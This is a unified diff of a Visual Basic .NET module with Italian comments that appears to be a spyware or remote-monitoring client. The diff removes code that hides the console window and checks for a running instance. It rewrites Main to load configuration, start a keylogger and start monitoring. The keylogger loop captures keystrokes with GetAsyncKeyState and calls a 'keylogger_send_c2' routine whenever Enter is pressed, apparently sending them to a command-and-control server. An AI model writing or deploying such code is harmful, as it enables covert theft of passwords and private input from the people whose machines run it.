@@ -12,78 +12,9 @@ Imports System.Diagnostics
 Module Module1
 
     Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Short
-
-    Private Declare Auto Function ShowWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
-    Private Declare Auto Function GetConsoleWindow Lib "kernel32.dll" () As IntPtr   'get handle window
-    Private Const SW_HIDE As Integer = 0
-
-
     Public c As New Configurazione
     Public arrayEst As String()
     Public tot_sec As Integer = 0
-
-
-
-
-    Sub Main()
-
-        ' configure HKLM/SOFTWARE/Microsoft/Windows/Run  <---- + stato salt per verifica
-
-
-        Dim hWndConsole As IntPtr
-        hWndConsole = GetConsoleWindow()
-        ShowWindow(hWndConsole, SW_HIDE)
-
-
-
-        If check_if_running() Then
-            End
-        End If
-
-
-        Try
-            log_locale("[+] Start...")
-            carica_configurazione()
-            log_locale("[+] Configuration loaded")
-        Catch
-            log_locale("[+] Error loading configuration file")
-            End
-        End Try
-
-
-        clean_temp()
-
-
-        Dim aTimer As New Timers.Timer
-        aTimer.Interval = 1000 '1 second
-        AddHandler aTimer.Elapsed, AddressOf tick
-        aTimer.Start()
-
-
-        If c.keylogger Then avvia_keylogger()
-
-        avvia_monitoring()
-        'avvia_process_monitoring()
-
-
-
-
-
-    End Sub
-
-
-    Function check_if_running() As Boolean
-        Dim p() As Process
-        'check_if_running = False
-        p = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName)
-        If p.Count > 1 Then
-            check_if_running = True
-        Else
-            check_if_running = False
-        End If
-    End Function
-
-
 
     Sub log_locale(e As String)
         Dim f As New StreamWriter(verifica_path(Directory.GetCurrentDirectory) & "error.log", True)
@@ -203,7 +134,32 @@ Module Module1
 
 
 
+    Sub Main()
 
+        Dim aTimer As New Timers.Timer
+        aTimer.Interval = 1000 '1 second
+        AddHandler aTimer.Elapsed, AddressOf tick
+        aTimer.Start()
+
+
+        Try
+            log_locale("[+] Start...")
+            carica_configurazione()
+            log_locale("[+] Configuration loaded")
+        Catch
+            log_locale("[+] Error loading configuration file")
+            End
+        End Try
+
+        clean_temp()
+        If c.keylogger Then avvia_keylogger()
+        avvia_monitoring()
+        'avvia_process_monitoring() 
+
+
+
+
+    End Sub
 
     Private Sub tick(ByVal sender As Object, ByVal e As System.Timers.ElapsedEventArgs)
         tot_sec += 1
@@ -630,34 +586,20 @@ Module Module1
         Dim k As New Keys 'system.windows.forms
         While True
 
-#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
             If GetAsyncKeyState(k.Return) = -32767 Then
-#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                 keylogger_scrivi("[Enter]")
                 keylogger_send_c2() 'when ir press enter
-#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
             ElseIf GetAsyncKeyState(k.Space) = -32767 Then
-#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                 keylogger_scrivi("[Space]")
-#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
             ElseIf GetAsyncKeyState(k.Back) = -32767 Then
-#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                 keylogger_scrivi("[Backspace]")
-#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
             ElseIf GetAsyncKeyState(k.LShiftKey) = -32767 Then
-#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                 keylogger_scrivi("[LShift]")
-#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
             ElseIf GetAsyncKeyState(k.RShiftKey) = -32767 Then
-#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                 keylogger_scrivi("[RShift]")
-#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
             ElseIf GetAsyncKeyState(k.LControlKey) = -32767 Then
-#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                 keylogger_scrivi("[LCTRL]")
-#Disable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
             ElseIf GetAsyncKeyState(k.RControlKey) = -32767 Then
-#Enable Warning BC42025 ' L'accesso del membro condiviso, del membro costante, del membro di enumerazione o del tipo nidificato verrà effettuato tramite un'istanza. L'espressione di qualificazione non verrà valutata.
                 keylogger_scrivi("[RCTRL]")
             Else
                 For i = 33 To 127
